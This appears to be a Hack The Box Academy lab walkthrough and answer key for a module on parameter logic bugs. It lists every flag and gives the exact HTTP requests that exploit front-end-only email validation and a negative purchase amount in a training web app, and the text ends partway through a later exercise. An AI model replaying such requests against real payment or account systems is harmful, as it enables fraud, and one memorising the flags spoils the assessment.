| Section                                         | Question Number | Answer                          |
| ----------------------------------------------- | --------------- | ------------------------------- |
| Module Methodology                              | Question 1      | 30                              |
| Setting Up                                      | Question 1      | false                           |
| Local Testing - Validation Logic Disparity      | Question 1      | HTB{7#3\_n3x7\_0n3\_!5\_#4rd3r} |
| PoC and Patching - Validation Logic Disparity   | Question 1      | HTB{d35p4!r\_4\_d!5p4r!7y}      |
| Unexpected Input                                | Question 1      | 18                              |
| Local Testing (Manipulation) - Unexpected Input | Question 1      | HTB{-1k\_cu635\_p12}            |
| PoC and Patching - Unexpected Input             | Question 1      | HTB{3xp3c7\_7#3\_un3xp3c73d}    |
| Null Safety                                     | Question 1      | resetPassword                   |
| Local Testing (functions) - Null Safety         | Question 1      | HTB{41w4y5\_c#3ck\_4\_nu115}    |
| PoC and Patching - Null Safety                  | Question 1      | HTB{nu11\_n07\_50\_50und}       |
| Skill Assessment - Parameter Logic Bugs         | Question 1      | HTB{4\_109!c\_6u95\_1!f3!}      |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Module Methodology

## Question 1

### "Feel free to use the above exercise to get familiar with the module's web application, which is always handy before jumping to reviewing and testing the codebase. When registering with a new user, how many cubes would you get by default?"

After spawning the target machine and visiting its root webpage, students need to click on "Register Now" to register a new user account:

![[HTB Solutions/CWEE/z. images/2bb9b0bff802539b06f4c4fcdb748b41_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/37f950f86d8afe63d4babaf1cdc8c13c_MD5.jpg]]

Once signed in, students will notice that by default, `30` cubes are awarded to the registered account:

![[HTB Solutions/CWEE/z. images/55b3ec0cdd6ef75b131cf275f37d0b85_MD5.jpg]]

Answer: `30`

# Setting Up

## Question 1

### "Set a breakpoint on line '24' in the file 'src/src/controllers/modules-controllers.js'. Then, in the web application's home page, click on the 'Introduction to Academy' module to view its details. This should break the application at your breakpoint. What is the value of 'module.isNew' at this point?"

Students first need to install `Docker` (if not already installed) and start it:

Code: shell

```shell
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-n6ljqyynzk]─[~]
└──╼ [★]$ sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker

Get:1 https://download.docker.com/linux/debian bullseye InRelease [43.3 kB]
Ign:2 https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 InRelease
<SNIP>
```

Subsequently, students need to download [validation\_logic\_disparity.zip](https://academy.hackthebox.com/storage/modules/239/validation_logic_disparity.zip), unzip it, and then open it in `Visual Studio Code`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/239/validation_logic_disparity.zip
unzip validation_logic_disparity.zip
code validation_logic_disparity/
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-vb8sveqj3g]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/239/validation_logic_disparity.zip
unzip validation_logic_disparity.zip
code validation_logic_disparity/

--2023-09-26 16:11:21--  https://academy.hackthebox.com/storage/modules/239/validation_logic_disparity.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Within `Visual Studio Code`, students need to open a new terminal (using `Ctrl` + \`) and build the "validationlogicdisparity:latest" docker image:

Code: shell

```shell
sudo docker build --pull --rm -f "Dockerfile" -t validationlogicdisparity:latest "."
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-vb8sveqj3g]─[~/validation_logic_disparity]
└──╼ [★]$ sudo docker build --pull --rm -f "Dockerfile" -t validationlogicdisparity:latest "."

Sending build context to Docker daemon  5.089MB
Step 1/24 : FROM mongo:latest
latest: Pulling from library/mongo
<SNIP>
Successfully built b3fd508eac58
Successfully tagged validationlogicdisparity:latest
```

Subsequently, students need to run the docker container:

Code: shell

```shell
sudo docker run --rm -d -p 27017:27017/tcp -p 5000:5000/tcp -p 9229:9229/tcp validationlogicdisparity:latest
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-ugqbkbim2v]─[~/validation_logic_disparity]
└──╼ [★]$ sudo docker run --rm -d -p 27017:27017/tcp -p 5000:5000/tcp -p 9229:9229/tcp validationlogicdisparity:latest

f1b762510f112fe5e6a372b51d4961a0f9e92af53ffbfda827d51d2cbce7c42e
```

On line 24 in `src/src/controllers/modules-controllers.js`, students need to set a breakpoint:

![[HTB Solutions/CWEE/z. images/9a7265971a0539648a61e067c47e1396_MD5.jpg]]

Then, students need to open "Run and Debug" and start debugging the docker container:

![[HTB Solutions/CWEE/z. images/4cecbd8839554c1fbe46dd98eb40d59f_MD5.jpg]]

After visiting `localhost:5000/` and signing in using the credentials `htb-student@academy.htb:HTB_@cademy_student!`, students need to click on the "Introduction to Academy" module:

![[HTB Solutions/CWEE/z. images/fa63901baa0d3bd2c1a75e3f2da64c01_MD5.jpg]]

When opening `Visual Studio Code`, students will notice that the application has hit the breakpoint; when checking `module.isNew`, students will notice that its value is `false`:

![[HTB Solutions/CWEE/z. images/97ed2c0df5404f307555c693d975edb8_MD5.jpg]]

Answer: `false`

# Local Testing - Validation Logic Disparity

## Question 1

### "Using the findings we have so far, try to attack the target, which has all exam slots already booked. If you are able to book a future CPTS exam slot, then you will be able to view its content to get the flag."

After spawning the target machine, students first need to install [HTTPie](https://httpie.io/) and its [httpie-jwt-auth](https://github.com/teracyhq/httpie-jwt-auth) plugin:

Code: shell

```shell
sudo apt install httpie
pip install -U httpie-jwt-auth
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-9ju4chiste]─[~]
└──╼ [★]$ sudo apt install httpie
pip install -U httpie-jwt-auth

Reading package lists... Done
Building dependency tree... Done
<SNIP>
```

Subsequently, students need to send a request to the `/api/users/login` endpoint (mapped to `src/src/controllers/users-controllers.js`, lines 126-167), passing the credentials `htb-student@academy.htb:HTB_@cademy_student!` to attain a JWT:

Code: shell

```shell
http POST http://STMIP:STMPO/api/users/login email=htb-student@academy.htb password=HTB_@cademy_student! | jq
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-mxeyt2skgs]─[~]
└──╼ [★]$ http POST http://94.237.62.195:37203/api/users/login email=htb-student@academy.htb password=HTB_@cademy_student! | jq

{
    "message": "Logged in!", 
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTgxMDM2MiwiZXhwIjoxNjk1ODk2NzYyfQ.hqRvbNJdi6sJNIWT_ov2UqougxZVB6MvkAx2dDM0xhg"
}
```

Having attained a JWT token, students need to get unavailable CPTS slots between a period starting from the current day (the end date does not matter) by sending a request to the `/api/exams/availability` endpoint (mapped to `src/src/controllers/exam-controllers.js`, lines 69-125), passing 1 for the `id` field to specify the CPTS exam:

Code: shell

```shell
http POST http://STMIP:STMPO/api/exams/availability id=1 startDate=2023-09-20T00:00:00.000Z endDate=2023-09-30T00:00:00.000Z | jq
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-mxeyt2skgs]─[~]
└──╼ [★]$ http POST http://94.237.62.195:37203/api/exams/availability id=1 startDate=2023-09-20T00:00:00.000Z endDate=2023-10-20T00:00:00.000Z | jq

{
    "unavailableSlots": [
        "2023-09-27T00:00:00.000Z",
        "2023-09-30T00:00:00.000Z",
        "2023-10-01T00:00:00.000Z",
        "2023-10-02T00:00:00.000Z",
        "2023-10-03T00:00:00.000Z",
        <SNIP>
    ]
}
```

Students need to exploit the validation logic disparity bug by picking any unavailable slot with a date in the future (excluding the current day), as the question states. To book a CPTS exam slot, students need to send a POST request to the `/api/exams/book` endpoint (mapped to `src/src/controllers/exam-controllers.js`, lines 164-239):

Code: shell

```shell
http POST http://STMIP:STMPO/api/exams/book id=1 date=2023-09-30T00:00:00.000Z --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-azrytaqsom]─[~]
└──╼ [★]$ http POST http://94.237.56.76:43639/api/exams/book id=1 date=2023-09-30T00:00:00.000Z --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTgxMDM2MiwiZXhwIjoxNjk1ODk2NzYyfQ.hqRvbNJdi6sJNIWT_ov2UqougxZVB6MvkAx2dDM0xhg"

{
    "message": "HTB Certified Penetration Testing Specialist (CPTS) exam successfully booked for 30/09/2023."
}
```

Having booked the exam in a future date, students need to view its contents by sending a GET request to the `/api/exams/content/1` endpoint (mapped to `src/src/controllers/exam-controllers.js`, lines 242-310), attaining the flag `HTB{7#3_n3x7_0n3_!5_#4rd3r}`:

Code: shell

```shell
http GET http://STMIP:STMPO/api/exams/content/1 --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-gjjlngsg7p]─[~]
└──╼ [★]$ http GET http://94.237.62.195:54893/api/exams/content/1 --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTgxMDM2MiwiZXhwIjoxNjk1ODk2NzYyfQ.hqRvbNJdi6sJNIWT_ov2UqougxZVB6MvkAx2dDM0xhg" | jq

{
    "examContent": {
        "_id": "651436303012355c1158ffb4", 
        "content": "flag: HTB{7#3_n3x7_0n3_!5_#4rd3r} <SNIP>", 
        "examId": 1
    }
}
```

Answer: `HTB{7#3_n3x7_0n3_!5_#4rd3r}`

# PoC and Patching - Validation Logic Disparity

## Question 1

### "Explore the web application to identify other fields/forms that only apply front-end validation, and try to find one that suffers from 'Validation Logic Disparity'. Then, after abusing it to obtain UNLIMITED cubes, unlock the "Intro to Academy" module and submit the flag in the first section."

Students first need to download [validation\_logic\_disparity.zip](https://academy.hackthebox.com/storage/modules/239/validation_logic_disparity.zip), unzip it, and then open it in `Visual Studio Code`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/239/validation_logic_disparity.zip
unzip validation_logic_disparity.zip
code validation_logic_disparity/
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-vb8sveqj3g]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/239/validation_logic_disparity.zip
unzip validation_logic_disparity.zip
code validation_logic_disparity/

--2023-09-26 16:11:21--  https://academy.hackthebox.com/storage/modules/239/validation_logic_disparity.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

In the web application's codebase, the "Unlimited" subscription grants access to all modules; in `src/src/controllers/modules-controllers.js`, the `unlockModule` function (lines 80-210) responsible for the business logic of unlocking modules checks if the user's subscription includes the locked module's tier (lines 148-149), and if it is, it unlocks the module for the user:

![[HTB Solutions/CWEE/z. images/a33e3c3845743191b12c04cfcb8a4140_MD5.jpg]]

The "Unlimited" subscription can unlock modules belonging to all tiers:

![[HTB Solutions/CWEE/z. images/eefec4ffc7270c88d734b6ca81e9ebac_MD5.jpg]]

When analyzing the `getUserSubscription` function in `src/src/subscriptions-controllers.js` (lines 25-65), students will notice that if the user's email address ends with "@hackthebox.com", the account is granted the "Unlimited" subscription (lines 28-36):

![[HTB Solutions/CWEE/z. images/e05fe791ea7d1696dad927723489beca_MD5.jpg]]

Therefore, students need to attempt gaining the "Unlimited" subscription by updating the "htb-student" account's email address to end with "@hackthebox.com". After spawning the target machine and signing in with the credentials `htb-student@academy.htb:HTB_@cademy_student!`, students need to go to "Settings":

![[HTB Solutions/CWEE/z. images/89637d3d322484672273f1461e4cc4b1_MD5.jpg]]

Students will notice that the front-end prevents updating the email to one ending with "@hackthebox.com":

![[HTB Solutions/CWEE/z. images/c04466c204cb2fe55c7fc7c0f3fc18d8_MD5.jpg]]

However, when analyzing the `updateUserDetails` function inside `src/src/controllers/users-controllers.js` (lines 169-228), students will notice that the back-end is not checking if the new email ends with "@hackthebox.com" (line 188):

![[HTB Solutions/CWEE/z. images/a8ed566bf3c4012723dc414814d15b83_MD5.jpg]]

Therefore, regardless of the front-end disallowing users to update their email address to one ending with "@hackthebox", the back-end does not, resulting in a disparity between the front and back ends. Students need to exploit this logic bug to attain the "Unlimited" subscription.

After opening the `Network` tab of the `Developer Tools` and clicking "Save" to capture the request when updating the user's details, students need to copy it as a `cURL` command:

![[HTB Solutions/CWEE/z. images/3e7f6bc200639b032110ef339603772c_MD5.jpg]]

Subsequently, students need to edit the email address to make it end with "@hackthebox.com":

Code: shell

```shell
curl -s 'http://STMIP:STMPO/api/users/update' -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer JWT' --data-raw '{"name":"HTB Student","username":"htb-student","email":"htb-student@hackthebox.com"}' | jq
```

```
┌─[eu-academy-1]─[10.10.14.35]─[htb-ac-413848@htb-7ujwhmdgro]─[~]
└──╼ [★]$ curl -s 'http://94.237.56.76:39458/api/users/update' -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NjA0MTk3MiwiZXhwIjoxNjk2MTI4MzcyfQ.dsby8Cfcyq_fzun63SCEEjfUyuhlVkEUjFvTZadvxCs' --data-raw '{"name":"HTB Student","username":"htb-student","email":"htb-student@hackthebox.com"}' | jq

{
  "message": "User details updated successfully!"
}
```

Afterward, students need to sign out and sign in again using the new email address:

![[HTB Solutions/CWEE/z. images/a65ec939aa2521cc137d55f65ee8d23b_MD5.jpg]]

Once signed in, students will notice that the user now has unlimited cubes; therefore, they need to unlock the "Introduction to Academy" module:

![[HTB Solutions/CWEE/z. images/0e7cc113781cd7e3cb0d11c8322dc4f2_MD5.jpg]]

Students will attain the flag `HTB{d35p4!r_4_d!5p4r!7y}` in the module's first section:

![[HTB Solutions/CWEE/z. images/359c36986fee244b440762f721335ff7_MD5.jpg]]

Answer: `HTB{d35p4!r_4_d!5p4r!7y}`

# Unexpected Input

## Question 1

### "Use VSCode to search the '/controllers' directory for functions that accept direct user input. How many total functions did you find?"

Students first need to download [unexpected\_input.zip](https://academy.hackthebox.com/storage/modules/239/unexpected_input.zip), unzip it, and then open it in `Visual Studio Code`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/239/unexpected_input.zip
unzip unexpected_input.zip
code unexpected_input/
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-yeqp4pid9t]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/239/unexpected_input.zip
unzip unexpected_input.zip
code unexpected_input/

--2023-09-26 05:47:32--  https://academy.hackthebox.com/storage/modules/239/unexpected_input.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Within `Visual Studio Code`, students need to right-click on `src/src/controllers` and then click on "Find in Folder...":

![[HTB Solutions/CWEE/z. images/ac41127a3b2f16825770ba41160bd6ed_MD5.jpg]]

Subsequently, students need to turn on regular expressions support and search for the pattern `(req.body)+|(req.params)+`:

![[HTB Solutions/CWEE/z. images/8627393207b839d20f6a152a284c1dac_MD5.jpg]]

The number of functions accepting direct user input is `18` (and not 19) since `getSectionContent` of `sections-controllers.js` uses `req.params` twice:

![[HTB Solutions/CWEE/z. images/3273fcea387adf9ad1fe5849fa020f5b_MD5.jpg]]

Answer: `18`

# Local Testing (Manipulation) - Unexpected Input

## Question 1

### "Try to exploit the 'unexpected input' vulnerability we have discussed to obtain enough cubes. Then, unlock the "Intro to Academy" module and obtain the flag in its first section."

After spawning the target machine, students first need to install [HTTPie](https://httpie.io/) and its [httpie-jwt-auth](https://github.com/teracyhq/httpie-jwt-auth) plugin:

Code: shell

```shell
sudo apt install httpie
pip install -U httpie-jwt-auth
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-9ju4chiste]─[~]
└──╼ [★]$ sudo apt install httpie
pip install -U httpie-jwt-auth

Reading package lists... Done
Building dependency tree... Done
<SNIP>
```

Subsequently, students need to send a request to the `/api/users/login` endpoint (mapped to `src/src/controllers/users-controllers.js`, lines 126-167), passing the credentials `htb-student@academy.htb:HTB_@cademy_student!` to attain a JWT:

Code: shell

```shell
http POST http://STMIP:STMPO/api/users/login email=htb-student@academy.htb password=HTB_@cademy_student! | jq
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-yeqp4pid9t]─[~]
└──╼ [★]$ http POST http://94.237.48.48:47552/api/users/login email=htb-student@academy.htb password=HTB_@cademy_student! | jq

{
    "message": "Logged in!", 
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTg4MjIzNywiZXhwIjoxNjk1OTY4NjM3fQ.9qYthhT41PoLz5BxqmaApopuNXU7gYxgE4KhIXoUIZ4"
}
```

Having attained a JWT token, students then need to get the card details of the current user (most importantly, its `id`) by sending a GET request to the `/api/payment/cards` endpoint (mapped to `src/src/controllers/payment-controller.js`, lines 8-43):

Code: shell

```shell
http GET http://STMIP:STMPO/api/payment/cards --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-yeqp4pid9t]─[~]
└──╼ [★]$ http GET http://94.237.48.48:47552/api/payment/cards --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTg4MjIzNywiZXhwIjoxNjk1OTY4NjM3fQ.9qYthhT41PoLz5BxqmaApopuNXU7gYxgE4KhIXoUIZ4" | jq

{
    "cards": [
        {
            "balance": 5, 
            "cvc": "123", 
            "endsWith": "3456", 
            "expiryMonth": "12", 
            "expiryYear": "2030", 
            "id": "6515120a25456d39eeea4eaf", 
            "name": "HTB Student", 
            "userId": "649f2893cba8d0d6e8412182"
        }
    ]
}
```

With the `id` `6515120a25456d39eeea4eaf` of the card attained, students need to exploit the unexpected input vulnerability and perform two 1000 cubes purchases, making the `amount` value of the second entry `-1`, which results in a total 0:

Code: json

```json
{
  "cardId": "6515120a25456d39eeea4eaf",
  "items": [
    {
      "name": "1000",
      "category": "cubes",
      "price": 100,
      "amount": 1
    },
    {
      "name": "1000",
      "category": "cubes",
      "price": 100,
      "amount": -1
    }
  ]
}
```

Students need to send a POST request to the `/api/payment/charge` endpoint (mapped to `src/src/controllers/payment-controllers.js`, lines 45-230), passing in its body the JSON data for the two purchases and the card ID:

Code: shell

```shell
echo -n '{"cardId":"6515120a25456d39eeea4eaf","items":[{"name":"1000","category":"cubes","price":100,"amount":1},{"name":"1000","category":"cubes","price":100,"amount":-1}]}' | http POST http://STMIP:STMPO/api/payment/charge --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-yeqp4pid9t]─[~]
└──╼ [★]$ echo -n '{"cardId":"6515120a25456d39eeea4eaf","items":[{"name":"1000","category":"cubes","price":100,"amount":1},{"name":"1000","category":"cubes","price":100,"amount":-1}]}' | http POST http://94.237.48.48:47552/api/payment/charge --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTg4MjIzNywiZXhwIjoxNjk1OTY4NjM3fQ.9qYthhT41PoLz5BxqmaApopuNXU7gYxgE4KhIXoUIZ4" | jq

{
    "message": "Successfully processed payment for a total of $0."
}
```

Subsequently, after visiting the root webpage of the spawned target machine and signing in using the credentials `htb-student@academy.htb:HTB_@cademy_student!`, students will have enough cubes to unlock the "Introduction to Academy" module:

![[HTB Solutions/CWEE/z. images/86daf938226decc8520b433467feec44_MD5.jpg]]

Students will attain the flag `HTB{-1k_cu635_p12}` in the module's first section:

![[HTB Solutions/CWEE/z. images/eb6a14a77170ec8711f39a11270d35b9_MD5.jpg]]

Answer: `HTB{-1k_cu635_p12}`

# PoC and Patching - Unexpected Input

## Question 1

### "The 'processPayment' function we just dissected has another 'unexpected input' logic bug. Try to review it again to identify this issue, then exploit it to unlock the "Intro to Academy" module and obtain the flag in its first section. Note 1: The previous bug is now patched. Note 2: You need to re-login or update your user details to refresh your token/cubes balance."

Students first need to download [unexpected\_input.zip](https://academy.hackthebox.com/storage/modules/239/unexpected_input.zip), unzip it, and then open it in `Visual Studio Code`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/239/unexpected_input.zip
unzip unexpected_input.zip
code unexpected_input/
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-zndkvrjq7t]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/239/unexpected_input.zip
unzip unexpected_input.zip
code unexpected_input/

--2023-09-28 11:41:58--  https://academy.hackthebox.com/storage/modules/239/unexpected_input.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

When analyzing the `processPayment` function of `src/src/controllers/payment-controllers.js` (lines 46-187), especially lines 72-102, students will notice that the back-end does not validate the `name` field passed by the front-end; therefore, if an invalid/non-existent `name` is sent for a `subscription` item, the [findOne](https://www.mongodb.com/docs/manual/reference/method/db.collection.findOne/) method (lines 94-98) will return `null`. Because the returned `subscription` object is used without checking for `nullability` (line 101), `total` will hold 0; this is due to `null` times any number equals 0 (as a result of `type juggling` in JS; `type juggling` is examined in subsequent sections of the module. Also, students can refer to [Whitebox Attacks](https://enterprise.hackthebox.com/academy-lab/undefined/preview/modules/205) for more on vulnerabilities arising from it):

![[HTB Solutions/CWEE/z. images/fdd3c2cd123a9a04bf0331cad2dfe6b4_MD5.jpg]]

Moreover, since `0 > 5` is not true, the back-end proceeds to process each item bought:

![[HTB Solutions/CWEE/z. images/813a489f8e03249de37d6549c6a5ea16_MD5.jpg]]

For `buyCubes`, the function updates the cubes count and returns successfully:

![[HTB Solutions/CWEE/z. images/556ca53f16c7a7b55fd982a2cb2b547b_MD5.jpg]]

However, for `buySubscription`, an error message is returned, and the function does not complete successfully:

![[HTB Solutions/CWEE/z. images/fb02993dddcef004483a4e14a11c29c5_MD5.jpg]]

Nevertheless, the back-end has already updated the cube count; therefore, it does not matter if an exception/error is thrown by `buySubscription`.

After spawning the target machine, students first need to install [HTTPie](https://httpie.io/) and its [httpie-jwt-auth](https://github.com/teracyhq/httpie-jwt-auth) plugin:

Code: shell

```shell
sudo apt install httpie
pip install -U httpie-jwt-auth
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-9ju4chiste]─[~]
└──╼ [★]$ sudo apt install httpie
pip install -U httpie-jwt-auth

Reading package lists... Done
Building dependency tree... Done
<SNIP>
```

Subsequently, students need to send a request to the `/api/users/login` endpoint (mapped to `src/src/controllers/users-controllers.js`, lines 126-167), passing the credentials `htb-student@academy.htb:HTB_@cademy_student!` to attain a JWT:

Code: shell

```shell
http POST http://STMIP:STMPO/api/users/login email=htb-student@academy.htb password=HTB_@cademy_student! | jq
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-lmjzvcebvu]─[~]
└──╼ [★]$ http POST http://94.237.62.195:45334/api/users/login email=htb-student@academy.htb password=HTB_@cademy_student! | jq

{
